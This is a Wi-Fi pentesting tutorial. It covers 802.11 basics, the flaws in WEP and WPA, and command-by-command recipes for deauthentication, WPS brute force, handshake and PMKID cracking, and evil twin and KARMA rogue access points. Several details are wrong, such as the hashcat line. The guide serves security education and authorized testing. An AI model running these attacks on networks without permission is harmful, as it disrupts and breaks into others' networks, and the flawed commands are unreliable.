# Wi-Fi Pentesting

In the modern age, wireless networks (WiFi) have become ubiquitous, facilitating seamless internet connectivity across devices. However, this convenience comes with significant security challenges. Penetration testing (pentesting) WiFi networks is crucial for identifying vulnerabilities and strengthening network defenses. This guide aims to provide a comprehensive step-by-step approach to WiFi pentesting, targeted at both beginners and intermediate users. We’ll cover essential WiFi commands, tools available in Kali Linux, and a variety of attacks to help you get started.

![WiFi Pentesting](https://media.licdn.com/dms/image/v2/D5622AQGwE3-mPWJI4Q/feedshare-shrink_2048_1536/feedshare-shrink_2048_1536/0/1680676985761?e=2147483647&v=beta&t=1Wnu80qJENz4M0DrdHcln7etEkmq7rkqQCBYg9T2qxY "WiFi Pentesting")

## Understanding WiFi Basics

### WiFi Basics

Before diving into pentesting, it’s essential to understand some basic WiFi concepts and commands. WiFi networks operate on different channels within the 2.4 GHz and 5 GHz bands. Each WiFi network is identified by its Service Set Identifier (SSID). The primary security protocols used in WiFi networks include WEP, WPA/WPA2-PSK, and WPA3.

## Wi-Fi Standards and Networks
 
### 802.11 Standards
- IEEE=Institute of Electrical and Electronics Engineers
- Its a worldwide association counting over 425,000 members dedicated to advancing technological innovation.
- IEEE 802.11 is related to Wi-Fi technologies

- The 2.4GHz band is divided into 14 overlapping channels with a 22MHz bandwidth around the central frequency.
- The 5.0GHz is less crowded and guarantees a higher number of non-overlapping channels.

### Type of Wireless Networks
Two main types:

  Infrastructure Network
  Ad-hoc Network

### Infrastrucutre Network
- A Basic Service Set (BSS) contains an Access Point (AP) and a set of wireless client stations (STAs).
- Every BSS has a unique formal identifier called BSSID (the MAc address of the AP)
- BSS also called SSID (Service Set Identifier)
- Extended Service Set (ESS) - In this config multiple BSS exist with a common SSID (now called ESSID) nut unique BSSID.
- The Access Points are linked together using a backbone Distribution System (DS) which is usually a wired Ethernet network, This enables communications between STAs associated in different BSSs and other segments of the network.

### Ad-hoc Network
- This type of network does not need an existing infrastrucure. All of the STAs directly communicate to each other, as there is not a central base. A set of station connected like this is called IBSS (Independent Basic Service Set)

### Wireless Frames
- In the context of the 802.11 specifications, datagrams are called frames.

Each frame consists of:
```
→ An header
→ An optional payload (data)
→ A Frame Check Sequence (FCS)
```

- The Frame Control field contains control information defining the type of 802.11 MAC frame and how to process the frame itself.
- The frame function is defined by the Type and Subtype fields.

Currently the standard describes three types of frames:
```
→ Management Frames
→ Control Frames
→ Data Frames
```

- The frames 'To DS' and 'From DS' indicate whether the frame is going to or exiting from the DS (distributed system)
- THe WEP field (aka Privacy Bit) is a boolean flag and indicates whether or not the WEP algorithm has been used to encrypt the packet. We will discuss WEP and other security features of 802.11 in the next session.

Addresses can be a combination of the following:
```
→ BSSID: identifies an AP
→ Destination Address (DA): final destination to receive the frame
→ Source Address (SA): original source that created the frame
→ Receiver Address (RA): receiving STA
→ Transmitter Address (TA): transmitting STA
```

- Frame Body is an option field (from 0 to 2312 bytes) that contains the payload of the transmission. 
- The Frame Check Sequence (a simple Cyclic Redundancy Check (CRC) of the entire frame), is used For transmission error detection.

### Beacon
- Beacon frames are periodically transmitted by an AP. Their purpose is to advertise the availability of a wireless network. They contain information about network parameters and AP capabilities such as supported throughput rates.
- beacons also contain the SSID but that value can be stripped from the frame For security reasons. (Hidden SSID)

### Probe Requests
- Are sent by a wireless client in order to determine the network availability status. It contains the SSID name of the network and is sent over all the wireless channels. A special "null" (0x00) SSID can be used if the client does not want to search For a specific network.

### Proble Responses
- Are sent by an AP upon the reception of a Probe Request.
- They are very similar to beacons but they can also contain additional information (as specified by the communicating client inside the correponsing Proble Request Frame)

### Authentication Frames
- Are used to perform the authentication process.
- Unlike association or probing, all authentication frames share the same subtype.


- After the authentication, a station needs to associate to an AP. This is the purpose of the Association Request Frames. These Frames carry information about the STA capabilities (e.g. supported data rate) and the SSID of the network to which it wishes to associate
- After receiving the association request, the AP considers associating with the STA, and (if positive) establishes an Association ID (AID) For the newly associated STA reserving necessary memory resources.

### Association Response Frame
- Contains an acceptance or rejection notice to the requesting STA. If the AP accepts the STA, the frame includes information regarding the association such as Association ID and supported data rates.
- The wireless STA can now start to communicate with other peers in the network through the AP.
- A station sends a DIsassociation Frame to another station if it wishes to termimate the association but the same frame can be used by either party of the communication.
- Disassociation is often used when the station is roaming from a BSS to another in order to keep the authentication status.
- The frame also contains a reason code field.

### Deauthentication Frames
- Used when all of the communication is terminated. Example, a STA that is shut down gracefully can send a deauthentication frame to alert the access point that its powering off. The AP can then free memory allocations and remove corresponding records in its internal structures.


## Security Features
We will explore 2 main aspects:
``` 
→ Traffic encryption
→ Station authentication
```

### Encryption

#### Wired Equivalent Privacy (WEP)
- Due to number of flaws it has been deprecated in subsequent versions of the standard.
- WEP uses the RC4 algorithm For encryption with a 40 (WEP-40) or 104 bits (WEP-104) long key.
- RC4 is a stream cipher that uses a pseudo-random generation algorithm (also called PRGA) coupled with an internal state and a key to generate a byte keystream.
- This keystream is then XORed to the plaintext to obtain the final encrypted cyphertext
- In WEP implementation, the RC4 internal state is reset on every frame.
- the PRGA algorithm is deterministic and would procuce the same results over and over if the same key is applied.
- To alleviate this problem, the RC4 implementation designed For WEP makes use of a 24 bits Initialization Vector (IV) as a concatenated prefix of the key.
- Key index is a number from 0 to 3 that stands as a key identifier. This mechanism was introduced to facilitate key changes in large organizations.
- Integrity Check Value (ICV) - This is a 4-byte CRC code of the original unencrypted frame.
- The purpose is to detect frame tampering by an attacker.

#### WEP Flaws
- The first flaw comes from the short length of the IVs.
- As this is only 24 bits, there is a 50% probability that the same IV will be repeated after only 5000 packets.
- In a semi-busy network, the packet rate is large enough to assure repetitions will happen quite often.

> Keystream reuse is a critical vulnerabilty

- If the attacker can get two cyphertexts that were encrypted with the same keystream and has knowledge about one of the two plaintexts, he can recover the other messages with a simple operation.
- Its also possible to abuse this vuln For the inverse task of recovering the keystream.
- An attacker that has obtained an encrypted frame should not be able to modify that frame and re-inject it into the network successfully.

- WEP uses CRC-32 to calculate a checksum (the ICV) of the payload before the encryption. The ICV is then sent encrypted along with the message.
- This leads to another WEP flaw: its actually possible to make controlled changes to the frame payload and re-inject it without the receiver noticing.

#### FMS attack
- relies on a subset of the possible IVs, named "weark IVs". While the other IVs are simply discarded during the attack, these weak IVs can 'leak' portions of the key; statistical attacks can be performed in order to fully recover the network key.
- Implementations of the attack are avaiable in the aireplay-ng tool.
- mr Klein 2005 discovered more correlations between the key and the RC4 generated keystream 
- moreover: [RC4 KeyStream](http://cage.ugent.be/~klein/RC4/RC4-en.ps)
- mr Pychkine, Tews, Weinmann, were able to optimize Kleins attack and apply it to the WEP scenario resulting in a powerful new methodology (named PTW)
- moreover: [EPrint.IACR.ORG](http://eprint.iacr.org/2007/120.pdf)
- The PTW was able to recover a 104-bit WEP key with 50% probability using onl 40k captured packets.


#### WPA (Wi-Fi Protected Access)
- The main addition was the use of a per-packet 128 bit key, generated using the Temporal Key Integrity Protocol (TKIP) - a feature that prevents the types of attacks that compromised WEP.
- This means that For each packet, a new key is dynamically generated.
- Another feature of WPA is the addition of a message integrity check (MIC)
- This is designed to prevent an attacker from capturing, altering and/or resending data packets; this replaces the Cyclic Redundancy check (CRC) used by WEP that could not provide any security guarantee.

#### WPA2
- The new standard deprecates the use of TKIP in favor of CCMP, a new AES-based encryption scheme with strong security properties.
- TKIP was still based on the RC4 cypher. Researchers were able to demonstrate attacks on WPA when TKIP encryption was in use by exploiting some of the known flaws existing in RC4.
- Since TKIP is not completely secure and has been deprecated, to guarantee the best security of a Wi-Fi network, WPA2 with CCMP/AES encryption must be used.


### Authentication
- In order to exchange messages, client stations must be associated with an AP. Before this can happen, stations need to authenticate themselves, proving they have the rights to access the wireless network.

- 802.11 specifications describes three possible connections states For a client that model this process:

```
Not authenticated
 → Authenticated but not associated
 → Authenticated and associated

The 802.11 original standard specified two different stations authentication modes:
 → Open Authentication
 → Shared Key Authentication (SKA)
```

#### Open System
- If Open authentication is enabled on the AP, the client station simply sends an Authentication Request Frame, specifying the target SSID, and receives an Authentication Response with a successful result.
- The information is broadcasted by the AP in beacon frames, so it cannot be considered a secret.

```
STA > Open System Authentication Request > AP
STA < Open System Authentication Response < AP
STA > Association Request > AP
STA < Association Response < AP
```

When one of the steps goes wrong:
```
Transmission errors
Stations incompatibilities
MAC filtering 
```

> The AP will report a failure status code in its Authentication Response.

- Useful to note, the messages exchanged during the process are sent unencrypted. WEP encryption is used only For Data Frames sent immediately after a successful authentication.

#### Shared Key Authentication
- SKA is available only when WEP is enabled. Different from the Open mode, when receiving an Authentication Request, the AP responds with a challenge text (128 bytes). The client needs to encrypt the challenge with the shared WEP key and return it to the AP in the next frame. Then the AP compares the decrypted challenge to the known plaintext and successfully authenticates the client if they are equal.

Schema:
```
STA > Authentication Request > AP
STA < Challenge Text < AP
STA > Encrypted Challenge > AP
STA < Authentication Response < AP
```

- An attacker will be able to authenticate to the AP once he has snooped over at least one authentication message flow.
- This clearly makes the Shared Key Authentication completely broken so you should not rely on it For any security requirements.

### Common WiFi Commands

Here are some fundamental commands used in WiFi pentesting:

- `ifconfig`: Displays network interfaces and their configurations.
- `iwconfig`: Similar to ifconfig but specifically for wireless interfaces.
- `airmon-ng`: Used to manage wireless interfaces.
- `airodump-ng`: Captures raw 802.11 frames.
- `aireplay-ng`: Injects frames into a network.
- `aircrack-ng`: Cracks WEP and WPA-PSK keys.

## Tools in Kali Linux for WiFi Pentesting

Kali Linux is a go-to distribution for penetration testers due to its wide array of pre-installed tools. Here are some essential tools for WiFi pentesting:

- **Aircrack-ng Suite**: A set of tools for auditing wireless networks.
- **Reaver**: A tool for WPS brute force attacks.
- **Wireshark**: A network protocol analyzer.
- **Wifite**: An automated wireless attack tool.
- **Bettercap**: A network attack and monitoring tool.
- **Kismet**: A network detector, packet sniffer, and intrusion detection system.

## Types of WiFi Attacks

### Denial of Service (DOS) Attacks

DOS attacks aim to make a network unavailable to its intended users. One common method is by flooding the network with deauthentication packets.

#### Step-by-Step Guide for DOS Attack

1. **Set Up Monitor Mode**:
    ```bash
    airmon-ng start wlan0
    ```

2. **Capture Packets**:
    ```bash
    airodump-ng wlan0mon
    ```

3. **Send Deauthentication Packets**:
    ```bash
    aireplay-ng --deauth 0 -a [Router BSSID] wlan0mon
    ```

### Deauthentication Attack

A deauthentication attack forces clients to disconnect from a network, which can be useful for capturing handshakes.

#### Performing a Deauthentication Attack

1. **Capture Handshake**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Send Deauth Packets**:
    ```bash
    aireplay-ng --deauth 10 -a [Router BSSID] -c [Client MAC] wlan0mon
    ```

### WPS Brute Force Attack

WPS (WiFi Protected Setup) brute force attacks target the WPS PIN to gain access to the network.

#### Using Reaver for WPS Attack

1. **Start Monitor Mode**:
    ```bash
    airmon-ng start wlan0
    ```

2. **Scan for WPS-Enabled Networks**:
    ```bash
    wash -i wlan0mon
    ```

3. **Run Reaver**:
    ```bash
    reaver -i wlan0mon -b [Router BSSID] -vv
    ```

### Cracking WEP

WEP is outdated and insecure, but some networks still use it. Cracking WEP involves capturing enough data packets to retrieve the encryption key.

#### Cracking WEP Step-by-Step

1. **Capture Data**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Inject ARP Packets**:
    ```bash
    aireplay-ng --arpreplay -b [Router BSSID] -h [Your MAC] wlan0mon
    ```

3. **Crack the Key**:
    ```bash
    aircrack-ng [Output file]-01.cap
    ```

### Cracking WPA/WPA2-PSK

Cracking WPA/WPA2-PSK involves capturing the handshake and using a dictionary attack to find the passphrase.

#### Capturing Handshake and Cracking WPA/WPA2-PSK

1. **Capture Handshake**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Send Deauth Packets**:
    ```bash
    aireplay-ng --deauth 10 -a [Router BSSID] -c [Client MAC] wlan0mon
    ```

3. **Crack Handshake**:
    ```bash
    aircrack-ng -w [Wordlist] -b [Router BSSID] [Output file]-01.cap
    ```

### PMKID Attack

The PMKID attack is a recent method that targets the RSN PMKID from a WPA2 handshake.

#### Executing a PMKID Attack

1. **Capture PMKID**:
    ```bash
    hcxdumptool -i wlan0mon -o [Output file] --enable_status=1
    ```

2. **Convert PMKID**:
    ```bash
    hcxpcaptool -z [PMKID file] [Output file]
    ```

3. **Crack PMKID**:
    ```bash
    hashcat -m 16800 -a 3 [PMKID file] [Wordlist]
    ```

### WPA Enterprise (MGT) Attack

WPA Enterprise uses a RADIUS server for authentication. Attacking this involves capturing EAP packets and attempting to crack them.

#### Capturing EAP Packets

1. **Capture Packets**:
    ```bash
    airodump-ng --bssid [Router BSSID] --channel [Channel] -w [Output file] wlan0mon
    ```

2. **Deauth Client**:
    ```bash
    aireplay-ng --deauth 10 -a [Router BSSID] -c [Client MAC] wlan0mon
    ```

3. **Crack EAP**:
    ```bash
    asleap -r [Output file]-01.cap -W [Wordlist]
    ```

### Client Attacks

Client attacks target the devices connected to a WiFi network rather than the access point itself. These can include exploiting vulnerabilities in the client devices or manipulating their connections.

#### Setting Up a Simple AP with Redirection to the Internet

1. **Create a Hostapd Configuration File**:
    ```bash
    interface=wlan0
    driver=nl80211
    ssid=TestAP
    channel=1
    ```

2. **Start Hostapd**:
    ```bash
    hostapd /etc/hostapd/hostapd.conf
    ```

3. **Set Up NAT**:
    ```bash
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sysctl -w net.ipv4.ip_forward=1
    ```

### Evil Twin Attack

An Evil Twin attack involves setting up a rogue access point with the same SSID as the target network to trick clients into connecting to it.

#### Setting Up an Evil Twin

1. **Create Fake AP**:
    ```bash
    airbase-ng -e [SSID] -c [Channel] wlan0mon
    ```

2. **Set Up NAT**:
    ```bash
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sysctl -w net.ipv4.ip_forward=1
    ```

### KARMA Attack

The KARMA attack exploits the tendency of devices to automatically connect to known networks. By broadcasting SSIDs that devices have previously connected to, an attacker can lure devices into connecting.

#### Performing a KARMA Attack

1. **Set Up KARMA AP**:
    ```bash
    bettercap -iface wlan0 --wifi-ap.ssid "FreeWifi" --wifi-ap.karma
    ```

### MANA Attack

MANA is an enhanced version of the KARMA attack, with additional capabilities for capturing credentials.

#### Executing a MANA Attack

1. **Start MANA**:
    ```bash
    hostapd-mana /etc/hostapd-mana.conf
    ```

2. **Capture Traffic**:
    ```bash
    tcpdump -i wlan0 -w mana.pcap
    ```

### Loud MANA Attack

Loud MANA is an aggressive variant of the MANA attack, designed to forcefully deauthenticate clients from legitimate APs to connect to the rogue AP.

#### Performing a Loud MANA Attack

1. **Start Loud MANA**:
    ```bash
    hostapd-mana /etc/hostapd-mana-loud.conf
    ```

2. **Capture Traffic**:
    ```bash
    tcpdump -i wlan0 -w loud-mana.pcap
    ```

### Known Beacons Attack

In this attack, beacons of well-known networks are broadcasted to deceive clients into connecting.

#### Executing a Known Beacons Attack

1. **Broadcast Known Beacons**:
    ```bash
    mdk3 wlan0 b -v [SSID list file]
    ```

### Wi-Fi Direct

Wi-Fi Direct allows devices to connect directly without a router. Attacking Wi-Fi Direct involves exploiting vulnerabilities in the protocol or connected devices.

#### Wi-Fi Direct Pentesting

1. **Discover Wi-Fi Direct Devices**:
    ```bash
    wpa_cli p2p_find
    ```

2. **Connect to a Device**:
    ```bash
    wpa_cli p2p_connect [Device MAC] pbc
    ```

---

Pentesting WiFi networks is an essential skill for identifying and mitigating security risks. By following the comprehensive steps and utilizing the tools outlined in this guide, beginners and intermediate users can effectively assess the security of wireless networks. Always ensure to have proper authorization before conducting any pentesting activities and use these skills responsibly to improve network security.
